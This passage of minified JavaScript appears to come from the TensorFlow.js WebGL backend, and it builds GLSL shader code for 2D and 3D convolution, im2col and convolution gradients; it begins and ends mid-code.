            this.userCode = `\n      ${y}\n\n      const ivec2 strides = ivec2(${c}, ${l});\n      const ivec2 pads = ivec2(${i}, ${a});\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d2 = coords[${I}];\n\n        ivec2 xRCCorner =\n            ivec2(coords[${b}], coords[${x}]) * strides - pads;\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        // Convolve x(?, ?, d1) with w(:, :, d1, d2) to get y(yR, yC, d2).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < ${h}; wR++) {\n          int xR = xRCorner + wR * ${u};\n\n          if (xR < 0 || xR >= ${t.inHeight}) {\n            continue;\n          }\n\n          for (int wC = 0; wC < ${p}; wC++) {\n            int xC = xCCorner + wC * ${d};\n\n            if (xC < 0 || xC >= ${t.inWidth}) {\n              continue;\n            }\n\n            for (int d1 = 0; d1 < ${f}; d1 += 4) {\n              vec4 wValues = vec4(\n                getW(wR, wC, d1, d2),\n                getW(wR, wC, d1 + 1, d2),\n                getW(wR, wC, d1 + 2, d2),\n                getW(wR, wC, d1 + 3, d2)\n              );\n\n              if (${g}) {\n                vec4 xValues = vec4(\n                  getX(batch, xR, xC, d1),\n                  getX(batch, xR, xC, d1 + 1),\n                  getX(batch, xR, xC, d1 + 2),\n                  getX(batch, xR, xC, d1 + 3)\n                );\n                dotProd += dot(xValues, wValues);\n              } else {\n                vec4 xValues = vec4(\n                  getX(batch, d1, xR, xC),\n                  getX(batch, d1 + 1, xR, xC),\n                  getX(batch, d1 + 2, xR, xC),\n                  getX(batch, d1 + 3, xR, xC)\n                );\n                dotProd += dot(xValues, wValues);\n              }\n            }\n\n            if (${1 === m}) {\n\n              if (${g}) {\n                dotProd +=\n                    getX(batch, xR, xC, ${f}) *\n                    getW(wR, wC, ${f}, d2);\n              } else {\n                dotProd +=\n                    getX(batch, ${f}, xR, xC) *\n                    getW(wR, wC, ${f}, d2);\n              }\n\n            } else if (${2 === m}) {\n              vec2 wValues = vec2(\n                getW(wR, wC, ${f}, d2),\n                getW(wR, wC, ${f} + 1, d2)\n              );\n\n              if (${g}) {\n                vec2 xValues = vec2(\n                  getX(batch, xR, xC, ${f}),\n                  getX(batch, xR, xC, ${f} + 1)\n                );\n                dotProd += dot(xValues, wValues);\n              } else {\n                vec2 xValues = vec2(\n                  getX(batch, ${f}, xR, xC),\n                  getX(batch, ${f} + 1, xR, xC)\n                );\n                dotProd += dot(xValues, wValues);\n              }\n\n            } else if (${3 === m}) {\n              vec3 wValues = vec3(\n                getW(wR, wC, ${f}, d2),\n                getW(wR, wC, ${f} + 1, d2),\n                getW(wR, wC, ${f} + 2, d2)\n              );\n\n              if (${g}) {\n                vec3 xValues = vec3(\n                  getX(batch, xR, xC, ${f}),\n                  getX(batch, xR, xC, ${f} + 1),\n                  getX(batch, xR, xC, ${f} + 2)\n                );\n                dotProd += dot(xValues, wValues);\n              } else {\n                vec3 xValues = vec3(\n                  getX(batch, ${f}, xR, xC),\n                  getX(batch, ${f} + 1, xR, xC),\n                  getX(batch, ${f} + 2, xR, xC)\n                );\n                dotProd += dot(xValues, wValues);\n              }\n\n            }\n          }\n        }\n\n        float result = dotProd;\n        ${C}\n        ${w}\n        setOutput(result);\n      }\n    `
        }
    }
    class cP {
        constructor(t) {
            this.variableNames = ["x", "W"],
            this.outputShape = t.outShape;
            const e = t.padInfo.front
              , s = t.padInfo.top
              , o = t.padInfo.left
              , r = t.strideDepth
              , i = t.strideHeight
              , a = t.strideWidth
              , c = t.dilationDepth
              , l = t.dilationHeight
              , u = t.dilationWidth
              , d = t.filterDepth
              , h = t.filterHeight
              , p = t.filterWidth
              , f = 4 * Math.floor(t.inChannels / 4)
              , m = t.inChannels % 4;
            this.userCode = `\n      const ivec3 strides = ivec3(${r}, ${i}, ${a});\n      const ivec3 pads = ivec3(${e}, ${s}, ${o});\n\n      void main() {\n        ivec5 coords = getOutputCoords();\n        int batch = coords.x;\n        int d2 = coords.u;\n\n        ivec3 xFRCCorner = ivec3(coords.y, coords.z, coords.w) * strides - pads;\n        int xFCorner = xFRCCorner.x;\n        int xRCorner = xFRCCorner.y;\n        int xCCorner = xFRCCorner.z;\n\n        // Convolve x(?, ?, ?, d1) with w(:, :, :, d1, d2) to get\n        // y(yF, yR, yC, d2). ? = to be determined. : = across all\n        // values in that axis.\n        float dotProd = 0.0;\n        for (int wF = 0; wF < ${d}; wF++) {\n          int xF = xFCorner + wF * ${c};\n\n          if (xF < 0 || xF >= ${t.inDepth}) {\n            continue;\n          }\n\n          for (int wR = 0; wR < ${h}; wR++) {\n            int xR = xRCorner + wR * ${l};\n\n            if (xR < 0 || xR >= ${t.inHeight}) {\n              continue;\n            }\n\n            for (int wC = 0; wC < ${p}; wC++) {\n              int xC = xCCorner + wC * ${u};\n\n              if (xC < 0 || xC >= ${t.inWidth}) {\n                continue;\n              }\n\n              for (int d1 = 0; d1 < ${f}; d1 += 4) {\n                vec4 xValues = vec4(\n                  getX(batch, xF, xR, xC, d1),\n                  getX(batch, xF, xR, xC, d1 + 1),\n                  getX(batch, xF, xR, xC, d1 + 2),\n                  getX(batch, xF, xR, xC, d1 + 3)\n                );\n                vec4 wValues = vec4(\n                  getW(wF, wR, wC, d1, d2),\n                  getW(wF, wR, wC, d1 + 1, d2),\n                  getW(wF, wR, wC, d1 + 2, d2),\n                  getW(wF, wR, wC, d1 + 3, d2)\n                );\n\n                dotProd += dot(xValues, wValues);\n              }\n\n              if (${1 === m}) {\n                dotProd +=\n                  getX(batch, xF, xR, xC, ${f}) *\n                  getW(wF, wR, wC, ${f}, d2);\n              } else if (${2 === m}) {\n                vec2 xValues = vec2(\n                  getX(batch, xF, xR, xC, ${f}),\n                  getX(batch, xF, xR, xC, ${f} + 1)\n                );\n                vec2 wValues = vec2(\n                  getW(wF, wR, wC, ${f}, d2),\n                  getW(wF, wR, wC, ${f} + 1, d2)\n                );\n                dotProd += dot(xValues, wValues);\n              } else if (${3 === m}) {\n                vec3 xValues = vec3(\n                  getX(batch, xF, xR, xC, ${f}),\n                  getX(batch, xF, xR, xC, ${f} + 1),\n                  getX(batch, xF, xR, xC, ${f} + 2)\n                );\n                vec3 wValues = vec3(\n                  getW(wF, wR, wC, ${f}, d2),\n                  getW(wF, wR, wC, ${f} + 1, d2),\n                  getW(wF, wR, wC, ${f} + 2, d2)\n                );\n                dotProd += dot(xValues, wValues);\n              }\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class J1 {
        constructor(t, e=!1, s=null, o=!1, r=!1) {
            this.variableNames = ["x", "W"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "pads",
                type: "ivec2"
            }, {
                name: "strides",
                type: "ivec2"
            }, {
                name: "dilations",
                type: "ivec2"
            }, {
                name: "inDims",
                type: "ivec2"
            }],
            this.outputShape = t.outShape,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const i = t.padInfo.left
              , a = t.strideWidth
              , c = t.dilationWidth
              , l = t.filterHeight
              , u = t.filterWidth
              , d = u;
            let h = "\n       int xR; int xC; int xCOffset;\n       vec4 wTexel; vec4 previous; vec4 final;";
            for (let g = 0; g < u; g++)
                h += `\n           vec4 xTexelC${2 * g};\n           int xTexelC${2 * g}Ready;\n           vec4 xTexelC${2 * g + 1};\n           int xTexelC${2 * g + 1}Ready;\n           vec4 xC${g};`;
            h += `\n     for (int r = 0; r < ${l}; r++) {\n      for (int d1 = 0; d1 < ${t.inChannels}; d1 += 2) {\n       `;
            for (let g = 0; g < u; g++)
                h += `\n           xTexelC${2 * g} = vec4(0.0);\n           xTexelC${2 * g}Ready = 0;\n           xTexelC${2 * g + 1} = vec4(0.0);\n           xTexelC${2 * g + 1}Ready = 0;\n           xC${g} = vec4(0.0);`;
            h += "\n         xR = xRCorner + r * dilations[0];\n         if (xR >=0 && xR < inDims[0]) {\n       ";
            for (let g = 0; g < (d + 1) / 2; g++) {
                const b = 2 * g;
                if (h += `\n           xC = xCCorner + ${b * c};\n           `,
                1 === a) {
                    if (b < u && (i % 2 == 1 ? (h += `\n                 xCOffset = xC + 1;\n                 if (xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${b}Ready == 0) {\n                   xTexelC${b} = getX(batch, xR, xCOffset, d1);\n\n                   // Need to manually clear unused channels in case\n                   // we're reading from recycled texture.\n                   if (xCOffset + 1 >= inDims[1]) {\n                     xTexelC${b}.zw = vec2(0.0);\n                   }\n                   xTexelC${b}Ready = 1;\n                 }\n               `,
                    h += 1 === c && b > 0 ? `\n                 xC${b} = vec4(xTexelC${b - 2}.zw, xTexelC${b}.xy);\n                 ` : `\n                   xCOffset = xC + 1 - 2;\n\n                   if (xCOffset >= 0 && xCOffset < inDims[1]) {\n                     previous = getX(batch, xR, xCOffset, d1);\n\n                     // Need to manually clear unused channels in case\n                     // we're reading from recycled texture.\n                     if (xCOffset + 1 >= inDims[1]) {\n                       previous.zw = vec2(0.0);\n                     }\n\n                     xC${b} = vec4(previous.zw, xTexelC${b}.xy);\n                   } else {\n                     xC${b} = vec4(0.0, 0.0, xTexelC${b}.xy);\n                   }\n                   `) : h += `\n                 if (xC >= 0 && xC < inDims[1] && xTexelC${b}Ready == 0) {\n                   xTexelC${b} = getX(batch, xR, xC, d1);\n                   if (xC + 1 >= inDims[1]) {\n                     xTexelC${b}.zw = vec2(0.0);\n                   }\n                   xTexelC${b}Ready = 1;\n                 }\n\n                 xC${b} = xTexelC${b};\n                 `,
                    b + 1 < u)) {
                        const x = i % 2 == 0 ? Bl(c) : c;
                        c % 2 == 0 && i % 2 == 1 || c % 2 != 0 && i % 2 != 1 ? (h += `\n                   xCOffset = xC + imod(pads[1], 2) + ${x};\n\n                   if (xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${b + 1}Ready == 0) {\n                     xTexelC${b + 1} = getX(batch, xR, xCOffset, d1);\n\n                     // Need to manually clear unused channels in case\n                     // we're reading from recycled texture.\n                     if (xCOffset + 1 >= inDims[1]) {\n                       xTexelC${b + 1}.zw = vec2(0.0);\n                     }\n                     xTexelC${b + 1}Ready = 1;\n                   }\n                   `,
                        h += c > 1 ? `\n                     xCOffset -= 2;\n                     if (xCOffset >= 0 && xCOffset < inDims[1]) {\n                      previous = getX(batch, xR, xCOffset, d1);\n                      xC${b + 1} = vec4(previous.zw, xTexelC${b + 1}.xy);\n                     } else {\n                      xC${b + 1} = vec4(0.0, 0.0, xTexelC${b + 1}.xy);\n                     }\n                     ` : `\n                     xC${b + 1} = vec4(xTexelC${b}.zw, xTexelC${b + 1}.xy);\n                     `) : h += 1 === x ? `\n                     xC${b + 1} = xTexelC${b};\n                     ` : `\n                     xCOffset = xC + ${x};\n\n                     if (xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${b + 1}Ready == 0) {\n                       xTexelC${b + 1} = getX(batch, xR, xCOffset, d1);\n                       if (xCOffset + 1 >= inDims[1]) {\n                         xTexelC${b + 1}.zw = vec2(0.0);\n                       }\n                       xTexelC${b + 1}Ready = 1;\n                     }\n\n                     xC${b + 1} = xTexelC${b + 1};\n                     `
                    }
                } else
                    b < u && (i % 2 == 1 ? (h += `\n                 xCOffset = xC + 1 - strides[1];\n                 if(xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${b}Ready == 0) {\n                   xTexelC${b} = getX(batch, xR, xCOffset, d1);\n                   // Need to manually clear unused channels in case\n                   // we're reading from recycled texture.\n                   if (xCOffset + 1 >= inDims[1]) {\n                     xTexelC${b}.zw = vec2(0.0);\n                   }\n                   xTexelC${b}Ready = 1;\n                 }\n\n                 if(xC + 1 >= 0 && xC + 1 < inDims[1] && xTexelC${b + 1}Ready == 0) {\n                   xTexelC${b + 1} = getX(batch, xR, xC + 1, d1);\n                   // Need to manually clear unused channels in case\n                   // we're reading from recycled texture.\n                   if (xC + 2 >= inDims[1]) {\n                     xTexelC${b + 1}.zw = vec2(0.0);\n                   }\n                   xTexelC${b + 1}Ready = 1;\n                 }\n\n                 xC${b} = vec4(xTexelC${b}.zw, xTexelC${b + 1}.zw);\n               `,
                    b + 1 < u && (h += `\n                   final = vec4(0.0);\n                   xCOffset = xC + 1 + strides[1];\n                   if(xCOffset >= 0 && xCOffset < inDims[1]) {\n                     final = getX(batch, xR, xCOffset, d1);\n                   }\n                   xC${b + 1} = vec4(xTexelC${b + 1}.xy, final.xy);\n                 `)) : (h += `\n                 if(xC >= 0 && xC < inDims[1] && xTexelC${b}Ready == 0) {\n                   xTexelC${b} = getX(batch, xR, xC, d1);\n                   if (xC + 1 >= inDims[1]) {\n                     xTexelC${b}.zw = vec2(0.0);\n                   }\n                   xTexelC${b}Ready = 1;\n                 }\n\n                 xCOffset = xC + strides[1];\n                 if(xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${b + 1}Ready == 0) {\n                   xTexelC${b + 1} = getX(batch, xR, xCOffset, d1);\n                   if (xCOffset + 1 >= inDims[1]) {\n                     xTexelC${b + 1}.zw = vec2(0.);\n                   }\n                   xTexelC${b + 1}Ready = 1;\n                 }\n\n                 xC${b} = vec4(\n                   xTexelC${b}.xy, xTexelC${b + 1}.xy);\n               `,
                    b + 1 < u && (h += `\n                   xC${b + 1} = vec4(xTexelC${b}.zw, xTexelC${b + 1}.zw);\n                 `)));
                b < u && (h += `\n             wTexel = getW(r, ${b}, d1, d2);\n             dotProd += xC${b}.xxzz * vec4(wTexel.xy, wTexel.xy);\n             if(d1 + 1 < ${t.inChannels}) {\n               dotProd += xC${b}.yyww * vec4(wTexel.zw, wTexel.zw);\n             }\n           `,
                b + 1 < u && (h += `\n               wTexel = getW(r, ${b + 1}, d1, d2);\n               dotProd += xC${b + 1}.xxzz * vec4(wTexel.xy, wTexel.xy);\n               if(d1 + 1 < ${t.inChannels}) {\n                 dotProd += xC${b + 1}.yyww * vec4(wTexel.zw, wTexel.zw);\n               }\n             `))
            }
            h += "\n     }\n   ",
            h += "\n     }\n   ",
            h += "\n     }\n   ";
            let p = ""
              , f = "";
            s && (p = o ? `vec4 activation(vec4 a) {\n           vec4 b = getPreluActivationWeightsAtOutCoords();\n           ${s}\n         }` : r ? `vec4 activation(vec4 a) {\n           vec4 b = getLeakyreluAlphaAtOutCoords();\n           ${s}\n         }` : `vec4 activation(vec4 x) {\n           ${s}\n         }`,
            f = "result = activation(result);");
            const m = e ? "result += getBiasAtOutCoords();" : "";
            e && this.variableNames.push("bias"),
            o && this.variableNames.push("preluActivationWeights"),
            r && this.variableNames.push("leakyreluAlpha"),
            this.userCode = `\n       ${p}\n\n       void main() {\n         ivec4 coords = getOutputCoords();\n         int batch = coords.x;\n         ivec2 xRCCorner = coords.yz * strides - pads;\n         int d2 = coords.w;\n         int xRCorner = xRCCorner.x;\n         int xCCorner = xRCCorner.y;\n\n         //intialize dotProd with a small epsilon seems to reduce GPU accuracy loss.\n         vec4 dotProd = vec4(0.000000000000001);\n\n         ${h}\n\n         vec4 result = dotProd - vec4(0.000000000000001);\n         ${m}\n         ${f}\n         setOutput(result);\n       }\n     `
        }
    }
    class lP {
        constructor(t, e) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "inputShape",
                type: "ivec4"
            }, {
                name: "pad",
                type: "ivec2"
            }, {
                name: "stride",
                type: "ivec2"
            }, {
                name: "dilation",
                type: "ivec2"
            }, {
                name: "inChannels",
                type: "int"
            }, {
                name: "itemsPerBlockRow",
                type: "int"
            }, {
                name: "outWidth",
                type: "int"
            }],
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const {dataFormat: s} = e
              , o = De()
              , r = "channelsLast" === s
              , i = r ? 1 : 2
              , a = r ? 2 : 3
              , c = this.enableShapeUniforms ? "if(blockIndex < outShape[2] && pos < outShape[1]) {" : `if(blockIndex < ${t[2]} && pos < ${t[1]}) {`;
            let l = "";
            for (let u = 0; u <= 1; u++)
                for (let d = 0; d <= 1; d++)
                    l += `\n          blockIndex = rc.z + ${d};\n          pos = rc.y + ${u};\n\n          ${c}\n            offsetY = int(blockIndex / outWidth) * stride[0] - pad[0];\n            d0 = offsetY + dilation[0] * (pos / itemsPerBlockRow);\n\n            if(d0 < inputShape[${i}] && d0 >= 0) {\n              // Use custom imod instead mod. On Intel GPU, mod may generate\n              // unexpected value.\n              // https://github.com/tensorflow/tfjs/issues/5447\n              offsetX = imod(blockIndex, outWidth) * stride[1] - pad[1];\n              d1 = offsetX + dilation[1] * (imod(pos, itemsPerBlockRow) /\n                  inChannels);\n\n              if(d1 < inputShape[${a}] && d1 >= 0) {\n\n                ch = imod(pos, inChannels);\n\n                if (${r}) {\n                  innerDims = vec2(d1, ch);\n                  result[${2 * u + d}] = getChannel(\n                    getA(rc.x, d0, int(innerDims.x),\n                    int(innerDims.y)), innerDims);\n                } else {\n                  innerDims = vec2(d0, d1);\n                  result[${2 * u + d}] = getChannel(\n                    getA(rc.x, ch, int(innerDims.x),\n                    int(innerDims.y)), innerDims);\n                }\n              }\n            }\n          }\n        `;
            this.userCode = `\n      void main() {\n        ivec3 rc = getOutputCoords();\n\n        vec4 result = vec4(0);\n\n        int blockIndex, pos, offsetY, d0, offsetX, d1, ch;\n        vec2 innerDims;\n\n        ${l}\n\n        ${o.output} = result;\n      }\n    `
        }
    }
    function Ml(n, t) {
        const e = n.length;
        return e >= 3 ? t ? [...n.slice(0, -3), n[e - 3] * n[e - 2], n[e - 1]] : [...n.slice(0, -3), n[e - 3], n[e - 2] * n[e - 1]] : !t && 1 === e && n[0] > 1 ? [n[0], 1] : null
    }
    function j1({x: n, filter: t, convInfo: e, backend: s, bias: o=null, preluActivationWeights: r=null, leakyreluAlpha: i=0, activation: a=null}) {
        const c = n.shape
          , l = s.texData.get(n.dataId)
          , u = e.inChannels
          , d = c[0] * c[1] * c[2]
          , h = e.outChannels
          , p = "channelsLast" === e.dataFormat
          , m = !1;
        let g;
        const b = [];
        if (null != r) {
            const y = Ml(r.shape, p);
            null != y && (r = tt({
                inputs: {
                    x: r
                },
                backend: s,
                attrs: {
                    shape: y
                }
            }),
            b.push(r))
        }
        if (null != o) {
            const y = Ml(o.shape, p);
            null != y && (o = tt({
                inputs: {
                    x: o
                },
                backend: s,
                attrs: {
                    shape: y
                }
            }),
            b.push(o))
        }
        if ((1 !== d && 1 !== h || !(u > A1)) && l.isPacked && p && null != l.texture && c[2] % 2 != 0 && Rt(l.shape.slice(-3), c.slice(-3))) {
            const y = c[0] * c[1] * (c[2] + 1)
              , w = {
                dataId: n.dataId,
                shape: [1, y, e.inChannels],
                dtype: n.dtype
            }
              , C = l.shape;
            l.shape = l.shape.slice(),
            l.shape[l.shape.length - 2]++,
            v(kl(l.shape, w.shape), (()=>`packed reshape ${l.shape} to ${w.shape} isn't free`));
            const k = tt({
                inputs: {
                    x: t
                },
                backend: s,
                attrs: {
                    shape: [1, e.inChannels, e.outChannels]
                }
            });
            b.push(k);
            const S = Ll({
                a: w,
                b: k,
                backend: s,
                transposeA: false,
                transposeB: m,
                bias: o,
                activation: a,
                preluActivationWeights: r,
                leakyreluAlpha: i
            })
              , T = s.texData.get(S.dataId);
            v(T.isPacked, (()=>"batchMatMul result is expected to be packed")),
            l.shape = C,
            T.shape = e.outShape,
            g = Je({
                inputs: {
                    x: S
                },
                backend: s
            }),
            g.shape = e.outShape,
            b.push(S)
        } else {
            const y = e.outHeight * e.outWidth
              , w = tt({
                inputs: {
                    x: n
                },
                backend: s,
                attrs: {
                    shape: p ? [e.batchSize, y, e.inChannels] : [e.batchSize, e.inChannels, y]
                }
            })
              , C = tt({
                inputs: {
                    x: t
                },
                backend: s,
                attrs: {
                    shape: [1, e.inChannels, e.outChannels]
                }
            })
              , k = Ll({
                a: p ? w : C,
                b: p ? C : w,
                transposeA: !p,
                transposeB: m,
                backend: s,
                bias: o,
                activation: a,
                preluActivationWeights: r,
                leakyreluAlpha: i
            });
            g = tt({
                inputs: {
                    x: k
                },
                backend: s,
                attrs: {
                    shape: e.outShape
                }
            }),
            b.push(w),
            b.push(C),
            b.push(k)
        }
        for (const y of b)
            s.disposeIntermediateTensorInfo(y);
        return g
    }
    function q1({x: n, filter: t, convInfo: e, backend: s, bias: o=null, preluActivationWeights: r=null, leakyreluAlpha: i=0, activation: a=null}) {
        const {filterWidth: c, filterHeight: l, inChannels: u, outWidth: d, outHeight: h, dataFormat: p} = e
          , f = "channelsLast" === p
          , m = c * l * u
          , g = h * d
          , b = [e.batchSize, m, g]
          , y = [];
        if (null != r) {
            const K = Ml(r.shape, f);
            null != K && (r = tt({
                inputs: {
                    x: r
                },
                backend: s,
                attrs: {
                    shape: K
                }
            }),
            y.push(r))
        }
        if (null != o) {
            const K = Ml(o.shape, f);
            null != K && (o = tt({
                inputs: {
                    x: o
                },
                backend: s,
                attrs: {
                    shape: K
                }
            }),
            y.push(o))
        }
        const w = tt({
            inputs: {
                x: t
            },
            backend: s,
            attrs: {
                shape: [1, m, Z(t.shape) / m]
            }
        });
        y.push(w);
        const C = new lP(b,e)
          , k = [n.shape, [e.padInfo.top, e.padInfo.left], [e.strideHeight, e.strideWidth], [e.dilationHeight, e.dilationWidth], [e.inChannels], [e.filterWidth * e.inChannels], [e.outWidth]]
          , S = s.runWebGLProgram(C, [n], "float32", k)
          , T = tt({
            inputs: {
                x: S
            },
            backend: s,
            attrs: {
                shape: b
            }
        });
        y.push(S),
        y.push(T);
        const R = null != o
          , L = null != r
          , V = "leakyrelu" === a
          , F = a ? aa(a, !0) : null
          , X = new M1(f ? T.shape : w.shape,f ? w.shape : T.shape,f ? [e.batchSize, g, e.outChannels] : [e.batchSize, e.outChannels, g],!0,!1,R,F,L,V)
          , A = f ? [T, w] : [w, T];
        if (o && A.push(o),
        L && A.push(r),
        V) {
            const K = s.makeTensorInfo([], "float32", gs(i, "float32"));
            A.push(K),
            y.push(K)
        }
        const P = s.runWebGLProgram(X, A, "float32")
          , B = tt({
            inputs: {
                x: P
            },
            backend: s,
            attrs: {
                shape: e.outShape
            }
        });
        y.push(P);
        for (const K of y)
            s.disposeIntermediateTensorInfo(K);
        return B
    }
    const dP = {
        kernelName: Ra,
        backendName: "webgl",
        kernelFunc: function uP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r} = t
              , {strides: i, pad: a, dataFormat: c, dilations: l, dimRoundingMode: u} = s
              , d = os(c)
              , h = ye(o.shape, r.shape, i, l, a, u, !1, d);
            let p;
            if (1 !== h.filterHeight || 1 !== h.filterWidth || 1 !== h.dilationHeight || 1 !== h.dilationWidth || 1 !== h.strideHeight || 1 !== h.strideWidth || "SAME" !== h.padInfo.type && "VALID" !== h.padInfo.type)
                if (h.strideWidth <= 2 && "channelsLast" === d && z().getBool("WEBGL_EXP_CONV")) {
                    const m = new J1(h)
                      , g = [[h.padInfo.top, h.padInfo.left], [h.strideHeight, h.strideWidth], [h.dilationHeight, h.dilationWidth], [h.inHeight, h.inWidth]];
                    p = e.runWebGLProgram(m, [o, r], "float32", g)
                } else if (z().getBool("WEBGL_CONV_IM2COL"))
                    p = q1({
                        x: o,
                        filter: r,
                        convInfo: h,
                        backend: e
                    });
                else {
                    const m = new Q1(h);
                    p = e.runWebGLProgram(m, [o, r], "float32")
                }
            else
                p = j1({
                    x: o,
                    filter: r,
                    convInfo: h,
                    backend: e
                });
            const f = tt({
                inputs: {
                    x: p
                },
                backend: e,
                attrs: {
                    shape: h.outShape
                }
            });
            return e.disposeIntermediateTensorInfo(p),
            f
        }
    };
    class hP {
        constructor(t) {
            this.variableNames = ["x", "dy"],
            this.outputShape = t.filterShape;
            const e = t.strideHeight
              , s = t.strideWidth
              , o = t.padInfo.top
              , r = t.padInfo.left
              , i = "channelsLast" === t.dataFormat;
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int wR = coords.x;\n        int wC = coords.y;\n        int d1 = coords.z;\n        int d2 = coords.w;\n\n        // Convolve x(?, ?, d1) with dy(:, :, d2) to get dw(wR, wC, d1, d2).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n\n        for (int b = 0; b < ${t.batchSize}; b++) {\n          for (int yR = 0; yR < ${t.outHeight}; yR++) {\n            int xR = wR + yR * ${e} - ${o};\n\n            if (xR < 0 || xR >= ${t.inHeight}) {\n              continue;\n            }\n\n            for (int yC = 0; yC < ${t.outWidth}; yC++) {\n              int xC = wC + yC * ${s} - ${r};\n\n              if (xC < 0 || xC >= ${t.inWidth}) {\n                continue;\n              }\n\n              ${i ? "float dyValue = getDy(b, yR, yC, d2);\n              float xValue = getX(b, xR, xC, d1);\n              dotProd += (xValue * dyValue);" : "float dyValue = getDy(b, d2, yR, yC);\n              float xValue = getX(b, d1, xR, xC);\n              dotProd += (xValue * dyValue);"}\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class pP {
        constructor(t) {
            this.variableNames = ["dy", "W"],
            this.outputShape = t.inShape;
            const e = t.filterHeight
              , s = t.filterWidth
              , o = t.strideHeight
              , r = t.strideWidth
              , i = "channelsLast" === t.dataFormat
              , a = e - 1 - t.padInfo.top
              , c = s - 1 - t.padInfo.left
              , l = i ? 1 : 2
              , u = i ? 2 : 3
              , d = i ? 3 : 1;
            this.userCode = `\n      const ivec2 pads = ivec2(${a}, ${c});\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d1 = coords[${d}];\n\n        ivec2 dyCorner = ivec2(coords[${l}], coords[${u}]) - pads;\n        int dyRCorner = dyCorner.x;\n        int dyCCorner = dyCorner.y;\n\n        // Convolve dy(?, ?, d2) with w(:, :, d1, d2) to compute dx(xR, xC, d1).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < ${e}; wR++) {\n          float dyR = float(dyRCorner + wR) / ${o}.0;\n\n          if (dyR < 0.0 || dyR >= ${t.outHeight}.0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          int wRPerm = ${e} - 1 - wR;\n\n          for (int wC = 0; wC < ${s}; wC++) {\n            float dyC = float(dyCCorner + wC) / ${r}.0;\n\n            if (dyC < 0.0 || dyC >= ${t.outWidth}.0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            int wCPerm = ${s} - 1 - wC;\n\n            for (int d2 = 0; d2 < ${t.outChannels}; d2++) {\n\n              if (${i}) {\n                float xValue = getDy(batch, idyR, idyC, d2);\n                float wValue = getW(wRPerm, wCPerm, d1, d2);\n                dotProd += xValue * wValue;\n              } else {\n                float xValue = getDy(batch, d2, idyR, idyC);\n                float wValue = getW(wRPerm, wCPerm, d1, d2);\n                dotProd += xValue * wValue;\n              }\n\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class fP {
        constructor(t) {
            this.variableNames = ["x", "dy"],
            this.outputShape = t.filterShape;
            const e = t.strideDepth
              , s = t.strideHeight
              , o = t.strideWidth
              , r = t.padInfo.front
              , i = t.padInfo.top
              , a = t.padInfo.left;
            this.userCode = `\n      void main() {\n        ivec5 coords = getOutputCoords();\n        int wF = coords.x;\n        int wR = coords.y;\n        int wC = coords.z;\n        int d1 = coords.w;\n        int d2 = coords.u;\n\n        float dotProd = 0.0;\n\n        for (int b = 0; b < ${t.batchSize}; b++) {\n          for (int yF = 0; yF < ${t.outDepth}; yF++) {\n            int xF = wF + yF * ${e} - ${r};\n\n            if (xF < 0 || xF >= ${t.inDepth}) {\n              continue;\n            }\n\n            for (int yR = 0; yR < ${t.outHeight}; yR++) {\n              int xR = wR + yR * ${s} - ${i};\n\n              if (xR < 0 || xR >= ${t.inHeight}) {\n                continue;\n              }\n\n              for (int yC = 0; yC < ${t.outWidth}; yC++) {\n                int xC = wC + yC * ${o} - ${a};\n\n                if (xC < 0 || xC >= ${t.inWidth}) {\n                  continue;\n                }\n\n                float dyValue = getDy(b, yF, yR, yC, d2);\n                float xValue = getX(b, xF, xR, xC, d1);\n                dotProd += (xValue * dyValue);\n              }\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class mP {
        constructor(t) {
            this.variableNames = ["dy", "W"],
            this.outputShape = t.inShape;
            const e = t.filterDepth
              , s = t.filterHeight
              , o = t.filterWidth
              , r = t.strideDepth
              , i = t.strideHeight
              , a = t.strideWidth
              , c = e - 1 - t.padInfo.front
              , l = s - 1 - t.padInfo.top
              , u = o - 1 - t.padInfo.left;
            this.userCode = `\n      const ivec3 pads = ivec3(${c}, ${l}, ${u});\n\n      void main() {\n        ivec5 coords = getOutputCoords();\n        int batch = coords.x;\n        int d1 = coords.u;\n\n\n        ivec3 dyCorner = ivec3(coords.y, coords.z, coords.w) - pads;\n        int dyFCorner = dyCorner.x;\n        int dyRCorner = dyCorner.y;\n        int dyCCorner = dyCorner.z;\n\n        float dotProd = 0.0;\n        for (int wF = 0; wF < ${e}; wF++) {\n          float dyF = float(dyFCorner + wF) / ${r}.0;\n\n          if (dyF < 0.0 || dyF >= ${t.outDepth}.0 || fract(dyF) > 0.0) {\n            continue;\n          }\n          int idyF = int(dyF);\n\n          int wFPerm = ${e} - 1 - wF;\n\n          for (int wR = 0; wR < ${s}; wR++) {\n            float dyR = float(dyRCorner + wR) / ${i}.0;\n\n            if (dyR < 0.0 || dyR >= ${t.outHeight}.0 ||\n              fract(dyR) > 0.0) {\n              continue;\n            }\n            int idyR = int(dyR);\n\n            int wRPerm = ${s} - 1 - wR;\n\n            for (int wC = 0; wC < ${o}; wC++) {\n              float dyC = float(dyCCorner + wC) / ${a}.0;\n\n              if (dyC < 0.0 || dyC >= 